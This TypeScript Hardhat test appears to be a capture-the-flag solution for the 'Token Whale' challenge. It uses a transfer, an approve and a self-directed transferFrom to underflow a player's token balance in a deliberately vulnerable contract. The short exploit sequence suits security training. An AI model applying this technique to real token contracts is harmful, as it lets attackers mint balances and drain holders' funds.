import { ethers } from 'hardhat';
import { expect } from 'chai';
import { utils } from 'ethers';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { TokenWhaleChallenge } from '../../typechain-types';

describe('TokenWhale', function () {
    let owner: SignerWithAddress;
    let user1: SignerWithAddress;
    let user2: SignerWithAddress;
    let challenge: TokenWhaleChallenge;

    beforeEach(async function () {
        [owner, user1, user2] = await ethers.getSigners();
        const challengeFactory = await ethers.getContractFactory('TokenWhaleChallenge');
        challenge = await challengeFactory.connect(owner).deploy(user1.address);
    });

    it('solves the challenge', async function () {
        await challenge.connect(user1).transfer(user2.address, 501);
        await challenge.connect(user2).approve(user1.address, 500);
        await challenge.connect(user1).transferFrom(user2.address, user2.address, 500);
        expect(await challenge.isComplete()).to.be.true;
    });
});
